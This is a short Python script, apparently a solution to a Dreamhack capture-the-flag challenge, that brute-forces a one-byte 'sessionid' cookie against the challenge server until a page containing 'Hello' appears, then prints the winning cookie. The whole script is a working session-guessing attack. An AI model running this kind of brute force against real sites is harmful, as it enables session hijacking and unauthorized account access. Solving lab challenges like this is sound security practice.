import requests
from tqdm import tqdm
import os


url = 'http://host3.dreamhack.games:22066/'


if __name__ == "__main__":
    for _ in tqdm(range(10000)):
        cookies = {'sessionid': os.urandom(1).hex()}

        response = requests.get(url, cookies=cookies)
        if 'Hello' in response.text:
            print(cookies)
            print(response.text)
            break
